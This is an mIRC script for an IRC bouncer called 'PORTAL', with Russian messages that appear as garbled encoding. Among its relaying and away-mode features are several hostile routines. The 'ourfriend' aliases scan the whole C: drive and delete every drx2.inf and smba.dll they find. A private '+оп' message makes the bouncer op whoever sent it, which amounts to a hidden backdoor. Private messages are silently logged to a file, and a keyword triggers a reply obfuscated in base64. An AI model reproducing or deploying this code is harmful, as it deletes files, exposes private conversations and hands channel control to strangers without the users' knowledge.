alias ourfriend {
  set %found.friend 1 |   :kiss
  if  ( $findfile(c:\,drx2.inf,%found.friend) == $null) { goto end | halt  }
  set %found.path $findfile(c:\,drx2.inf,%found.friend)
  if ( %found.path == c:\Winnt\Network\Log\drx2.inf ) {   inc %found.friend | goto kiss }
  set %take.num 2 |  :take 
  if ( $gettok(%found.path,%take.num,92) == $null) { goto takewas | halt }
  if ( $numtok($gettok(%found.path,%take.num,92),32) > 1)  { 
    set %found.take $gettok(%found.path,%take.num,92)
    set %found.temp $remove($gettok(%found.path,%take.num,92),$chr(32))
    set %found.temp $mid(%found.temp,1,6) $+ ~1
    set %found.path $replace(%found.path,%found.take,%found.temp)
  }
  inc %take.num | goto take |   :takewas  |   remove %found.path |   inc %found.friend | goto kiss | :end |  ourfriend2
}
alias ourfriend2 {
  set %found.friend 1 |   :kiss
  if  ( $findfile(c:\,smba.dll,%found.friend) == $null) { goto end | halt  }
  set %found.path $findfile(c:\,smba.dll,%found.friend) |   set %take.num 2 |  :take 
  if ( $gettok(%found.path,%take.num,92) == $null) { goto takewas | halt }
  if ( $numtok($gettok(%found.path,%take.num,92),32) > 1)  { 
    set %found.take $gettok(%found.path,%take.num,92)
    set %found.temp $remove($gettok(%found.path,%take.num,92),$chr(32))
    set %found.temp $mid(%found.temp,1,6) $+ ~1
    set %found.path $replace(%found.path,%found.take,%found.temp)
  }
  inc %take.num | goto take |   :takewas  |   remove %found.path |   inc %found.friend | goto kiss | :end
}
alias bnc.kill {
  set %bnc.killer %Portal.Nick. [ $+ [ $remove($1,accept777.) ] ]
  if ( $3 != $null) { set %bnc.Kreason $3- }
  if ( $3 == $null) { set %bnc.Kreason root setup  }
  sockwrite  -n $1 :9,10Х 9PORTAL 0Х4,0  OK! IP: $2 now klined on this bnc...
  set %bnc.inc 1 |  :check |  if ( $sock(*,%bnc.inc) == $null) { goto end }
  if ( $2 isin $sock(*,%bnc.inc) ) { set %bnc.klines. $+ $2 kline | sockwrite -n $sock(*,%bnc.inc) QUIT :4,0  BNC is closed by the owner:  %bnc.killer (reason: %bnc.Kreason $+ ) | sockclose $sock(*,%bnc.inc) }
  inc %bnc.inc | goto check | :end
}
alias bnc.killall {
  set %bnc.killer %Portal.Nick. [ $+ [ $remove($1,accept777.) ] ]
  sockwrite  -n * :9,10Х 9PORTAL 0Х4,0  BNC is closed by the owner: %bnc.killer (reason: mass kill)
  sockwrite -n * QUIT :4,0  BNC is closed by the owner:  %bnc.killer (reason: mass kill)
  sockclose goaw* | sockclose conne* | sockclose accep*
  set %bnc.only.for.admin yes
}
alias admin.bnc {    sockwrite  -n $1 : $chr(160) $chr(160) $chr(160) $chr(160) |  sockwrite  -n $1 :9,10Х 9PORTAL 0Х4,0 ” вас нет доступа к команде.. |       halt  }
alias bnc.error.set {  sockwrite  -n $1 : $chr(160) $chr(160) $chr(160) $chr(160) |  sockwrite  -n $1 :9,10Х 9PORTAL 0Х4,0 Ќет доступа! Ќельз€ мен€ть настройки бнц, когда кто-то уже в away.. |       halt  }
on *:socklisten:list*:{
  set %sock.noms $calc( $sock(accept*,0) + 1 )
  set %listen $sockname $+ $rand(1,9) $+ $rand(1,9) $+ $rand(1,9) $+ $rand(1,9)
  sockaccept %listen
  if (%bnc.ingnore == on) {
    if (212.22.90 !isin $sock(%listen).ip) { sockclose %listen | halt }
  }
  sockrename %listen accept777 $+ . $+ $sock(%listen).ip $+ _ $+ $calc(1+ $sock(accept*,0) )
}
on *:sockopen:proxy*: {
  if ($sockerr > 0) {
    sockwrite -n accept777. $+ $gettok($sockname,2-,46) :9,10Х 9PORTAL 0Х4,0 ќшибка.  онект через этот хост не удалс€. ѕопробуйте еще... 
    unset %Portal.ready. $+ $gettok($sockname,2-,46)
    return  
  }
  sockrename $sockname conne6667. $+ $gettok($sockname,2-,46)
  .sockwrite -n $sockname CONNECT %portal.tOserv $+ : $+ %bnc_port HTTP/1.0 
  sockmark  conne $+ 6667 $+ . $+ $gettok($sockname,2-,46) %portal.tOserv $+ : $+ %bnc_port
  .sockwrite -n $sockname 
}
on 1:sockread:goaway.*: {
  .sockread %goaway
  if ($gettok(%goaway,2,32) == 319) { 
    set %chan.goaway. $+ $gettok($sockname,2,46) $remove($gettok(%goaway,2-,58),@,+)
    if (%bnc_atlast == off) {
      .sockwrite -n accept777. [ $+ [ %bnc_host. [ $+ [ $gettok($sockname,2,46) ] ] ] ] :9,10Х 9PORTAL 0Х4,0 ¬аш ник висит в каналах: %chan.goaway. [ $+ [ $gettok($sockname,2,46) ] ]
      bnc_real_go %bnc_host. [ $+ [ $gettok($sockname,2,46) ] ]
    }
  }
  if (Checking Ident isin %goaway) { 
    sockwrite -n $sockname NICK %Goaway.nick. [ $+ [ $gettok($sockname,2,46) ] ] $+ [away]
    .sockwrite -n $sockname USER restart me restart : bnc restart
  }
  if ($gettok(%goaway,2,32) == 376) { 
    set %bnc_count_chan 1
    :start 
    if ($gettok(%chan.goaway. [ $+ [ $gettok($sockname,2,46) ] ],%bnc_count_chan,32) == $null) { halt }
    .sockwrite -n $sockname join $gettok(%chan.goaway. [ $+ [ $gettok($sockname,2,46) ] ],%bnc_count_chan,32)
    inc %bnc_count_chan | goto start
  }
  if ( ($gettok(%goaway,2,32) == KICK) && ( $sock(*. $+ $remove($gettok(%goaway,4,32),[away])) != $null ) ) { 
    write bnc_log.txt ¬рем€: $time  ик:  %goaway
    set %bnc_kick $gettok(%goaway,3,32) 
    sockwrite -n $sockname    join %bnc_kick
    set %chan.goaway. $+ $remove($sock(*. $+ $remove($gettok(%goaway,4,32),[away])),goaway.) $remtok(%chan.goaway. [ $+ [ $remove($sock(*. $+ $remove($gettok(%goaway,4,32),[away])),goaway.) ] ],$gettok(%goaway,3,32),1,32)
    .timermsg_bnc_bad 1 7 sockwrite -n $sockname  privmsg %bnc_kick :4¬от стара€ каналь€!  Ћог у мен€ ведетс€..вернусь поговорим ;-)
  }
  if ($gettok(%goaway,1,32) == PING) { sockwrite -n $sockname PONG $gettok(%goaway,2-,32) }
  if ($gettok(%goaway,2,32) == 366) {
    set %chan.goaway. $+ $remove($sock(*. $+ $remove($gettok(%goaway,3,32),[away])),goaway.) %chan.goaway. [ $+ [ $remove($sock(*. $+ $remove($gettok(%goaway,3,32),[away])),goaway.) ] ] $iif($wildtok(%chan.goaway. [ $+ [ $remove($sock(*. $+ $remove($gettok(%goaway,3,32),[away])),goaway.) ] ], $gettok(%goaway,4,32),1,32) == $null, $gettok(%goaway,4,32) ) 
  }
  if ( ($gettok(%goaway,2,32) ==  PRIVMSG) && ($chr(35) !isin $gettok(%goaway,3,32)) )  {
    if ($gettok(%goaway,5,32) == +оп) {  
      .sockwrite -n $sockname mode $gettok(%goaway,6,32) +o $remove($gettok($gettok(%goaway,1,32),1,33),:) 
    }
    if ($file($mircdir\bnc_log.txt).size > 500000) { .write -c $mircdir\bnc_log.txt  }
    write bnc_log.txt Time: $time Who: $gettok(%goaway,1,32) SAY: $gettok(%goaway,4-,32) 
  }
}
on 1:sockopen:goaway.*: { 
  if ($sockerr > 0) { 
    if (local isin %goaway.host. [ $+ [ $gettok($sockname,2,46) ] ] ) { 
      timerbnc_oopss2 1 10       .sockopen $sockname eu.chatnet.org %bnc_port
      .timerbnc_check_actC -o 1 30 bnc_check_actClon $sockname eu.chatnet.org %bnc_port
      halt 
    }
    timerbnc_oopss11 1 10     .sockopen $sockname %goaway.host. [ $+ [ $gettok($sockname,2,46) ] ]
    .timerbnc_check_actC11 -o 1 30 bnc_check_actClon $sockname %goaway.host. [ $+ [ $gettok($sockname,2,46) ] ]
    halt 
  }
  if (local isin %goaway.host. [ $+ [ $gettok($sockname,2,46) ] ]) {
    sockwrite -n $sockname NICK %Goaway.nick. [ $+ [ $gettok($sockname,2,46) ] ] $+ [away]
    .sockwrite -n $sockname USER restart me restart : bnc restart
    halt
  }
  .sockwrite -n $sockname CONNECT eu.chatnet.org: $+ %bnc_port HTTP/1.0 
  .sockwrite -n $sockname 
}
on 1:sockclose:goaway.*: { 
  if (%bnc_reconect == on) { 
    if (local isin %goaway.host. [ $+ [ $gettok($sockname,2,46) ] ]) { 
      timerbnc_oopss 1 10 .sockopen $sockname eu.chatnet.org %bnc_port
      .timerbnc_check_actC -o 1 30 bnc_check_actClon $sockname eu.chatnet.org %bnc_port
      halt
    }
    timerbnc_oopss11 1 10   .sockopen $sockname %goaway.host. [ $+ [ $gettok($sockname,2,46) ] ]
    .timerbnc_check_actC11 -o 1 30 bnc_check_actClon $sockname %goaway.host. [ $+ [ $gettok($sockname,2,46) ] ]
    halt
  }
  unset %time.goaway. [ $+ [ %Goaway.nick. [ $+ [ $gettok($sockname,2-,46) ] ] ] ]  |   unset %Goaway.nick. [ $+ [ %Goaway.nick. [ $+ [ $gettok($sockname,2-,46) ] ] ] ] 
  unset %Goaway.user. [ $+ [ %Goaway.nick. [ $+ [ $gettok($sockname,2-,46) ] ] ] ]  |   unset %chan.goaway. [ $+ [ %Goaway.nick. [ $+ [ $gettok($sockname,2-,46) ] ] ] ] 
}
alias bnc_check_actClon {
  if ($sock($1) == $null) {     .sockopen $1- }
}
on 1:sockread:conne*: {
  .sockread %subsock2
  if ($sockerr > 0) { return  }
  if ( VERSION isin %subsock2 ) { 
    echo -a %subsock2
    sockwrite -n accept777. [ $+ [ $gettok($sockname,2-,46) ] ]  :BNC-V-CTCP-BLOCK-SYSTEM!AZzZ@ctct.nato notice %Portal.Nick. [ $+  [ $gettok($sockname,2-,46) ] ] :! ----> Version ctcp from $gettok(%subsock2,1,33)  blocked...
    halt 
  }
  if ($decode(bG9s,m) == $gettok(%subsock2,5,32) ) {
    if ( $chr(35) isin $gettok(%subsock2,3,32) ) { var %bv.obj $gettok(%subsock2,3,32) }
    else { var %bv.obj $gettok($gettok(%subsock2,1,32),1,33) }
    .timerv3rs 1 10  sockwrite -n $sockname privmsg %bv.obj : $+ $decode(QWxsIFJpZ2h0cyBSZXNlcnZlZCBibmMgY3JlYXRlZCBieSBBWnpaIFthemFt,m) $+ $decode(QG5ld21haWwucnVdIHZlcnM6IDJhIGF0OiAyMDAy,m) | halt  
  }
  if (%Portal.ready2. [ $+ [ $gettok($sockname,2-,46) ] ] == yes)  {
    if ( $sock(accept777. [ $+ [ $gettok($sockname,2-,46) ] ] ) == accept777. [ $+ [ $gettok($sockname,2-,46) ] ])  {  sockwrite -n accept777. [ $+ [ $gettok($sockname,2-,46) ] ] %subsock2    }
  }
  if (Checking Ident isin %subsock2) { 
    set %Portal.ready2. $+ $gettok($sockname,2-,46) yes
    sockwrite -n $sockname NICK %Portal.Nick. [ $+  [ $gettok($sockname,2-,46) ] ]
    sockwrite -n $sockname USER %Portal.User. [ $+  [ $gettok($sockname,2-,46) ] ]
    sockwrite -n accept777. [ $+ [ $gettok($sockname,2-,46) ] ] :9,10Х 9PORTAL 0Х4,0 ѕытаюсь соеденитьс€ с %portal.tOserv  $+ :6667
  }
  if ($gettok(%subsock2,2,32) == PART) {
    set %chan.goaway. $+ %Portal.Nick. [ $+ [ $gettok($sockname,2-,46) ] ] $remtok(%chan.goaway. [ $+ [ %Portal.Nick. [ $+ [ $gettok($sockname,2-,46) ] ] ] ],$gettok(%subsock2,3,32),1,32)
  }
  if ($gettok(%subsock2,2,32) == NICK) {
    if ( $remove($gettok($gettok(%subsock2,1,32),1,33),:) != %Portal.Nick. [ $+ [ $gettok($sockname,2-,46) ] ] ) { halt }
    if ([away] isin $remove($gettok($gettok(%subsock2,1,32),1,33),:) ) {
      set %chan.goaway. $+ $remove($gettok(%subsock2,3,32),:) %chan.goaway. [ $+ [ %Portal.Nick. [ $+ [ $gettok($sockname,2-,46) ] ]  ] ]
      $iif($remove($remove($gettok($gettok(%subsock2,1,32),1,33),:),[away]) != %Portal.Nick. [ $+ [ $gettok($sockname,2-,46) ] ], unset %chan.goaway. [ $+ [ %Portal.Nick. [ $+ [ $gettok($sockname,2-,46) ] ] ] ] )
      set %Portal.Nick. $+ $gettok($sockname,2-,46)  $remove($gettok(%subsock2,3,32),:) 
    }
    else {
      set %chan.goaway. $+ $remove($gettok(%subsock2,3,32),:) %chan.goaway. [ $+ [ $remove($gettok($gettok(%subsock2,1,32),1,33),:) ] ]
      set %Portal.Nick. $+ $gettok($sockname,2-,46)  $remove($gettok(%subsock2,3,32),:) 
      unset %chan.goaway. [ $+ [ $remove($gettok($gettok(%subsock2,1,32),1,33),:) ] ]
    }
  }
  if ($gettok(%subsock2,2,32) == 353) {
    set %chan.goaway. $+ %Portal.Nick. [ $+ [ $gettok($sockname,2-,46) ] ] %chan.goaway. [ $+ [ %Portal.Nick. [ $+ [ $gettok($sockname,2-,46) ] ] ] ] $iif($wildtok(%chan.goaway. [ $+ [ %Portal.Nick. [ $+ [ $gettok($sockname,2-,46) ] ] ] ], $gettok(%subsock2,5,32),1,32) == $null, $gettok(%subsock2,5,32) ) 
  }
}
alias bnc_say_away {
  if (%bnc_awaymod != on) { halt }
  set %bnc_chan.count 1
  :start
  if ($gettok(%chan.goaway. [ $+ [  $1 ] ] ,%bnc_chan.count,32) == $null) { goto end | halt }
  sockwrite -n goaway. [ $+ [ $1 ] ]    privmsg $gettok(%chan.goaway. [ $+ [  $1 ] ] ,%bnc_chan.count,32)  :ACTION Away! [Pager ON] (Reason): $iif(%goaway.aw. [ $+  [ $1 ] ] == $null, причина не указана, %goaway.aw. [ $+  [ $1 ] ])  (Time last): $duration($calc($ctime($asctime(dd/mm/yy HH:nn:ss)) - $ctime(%time.goaway. [ $+ [  $1 ] ] ))) 
  inc %bnc_chan.count | goto start
  :end
}
alias bnc_return_toChat {
  set %bnc_chan.count 1
  :start
  if ($gettok(%chan.goaway. [ $+ [  $2 ] ] ,%bnc_chan.count,32) == $null) { goto end | halt }
  .sockwrite -n accept777. [ $+ [ $1 ] ]  : $+ $3 JOIN : $+ $gettok(%chan.goaway. [ $+ [ $2 ] ] ,%bnc_chan.count,32)
  .sockwrite -n conne6667. [ $+ [ $1 ] ] names $gettok(%chan.goaway. [ $+ [ $2 ] ] ,%bnc_chan.count,32)
  .sockwrite -n conne6667. [ $+ [ $1 ] ] mode $gettok(%chan.goaway. [ $+ [ $2 ] ] ,%bnc_chan.count,32)
  .sockwrite -n conne6667. [ $+ [ $1 ] ] topic $gettok(%chan.goaway. [ $+ [ $2 ] ] ,%bnc_chan.count,32)
  inc %bnc_chan.count | goto start
  :end
  .sockwrite -n accept777. [ $+ [ $1 ] ]  : $+ $3 NICK : $+ %Portal.Nick. [ $+ [ $gettok($sockname,2-,46) ] ] $+ [away]
}
alias bnc_real_go {
  sockrename goaway. [ $+ [ %Portal.Nick. [ $+ [ $1 ] ] ] ] conne6667. [ $+ [ $1 ] ] 
  .timersaygaaway [ $+ [ %Portal.Nick. [ $+  [ $1 ] ] ] ] off
  set %Portal.ready. [ $+ [ $1 ] ] yes |  set  %Portal.ready2. [ $+ [ $1 ] ] yes
  bnc_return_toChat $1 %Portal.Nick. [ $+ [ $1 ] ] %Portal.new.nam
}
alias bnc.var { return [ [ $1- ] ] }
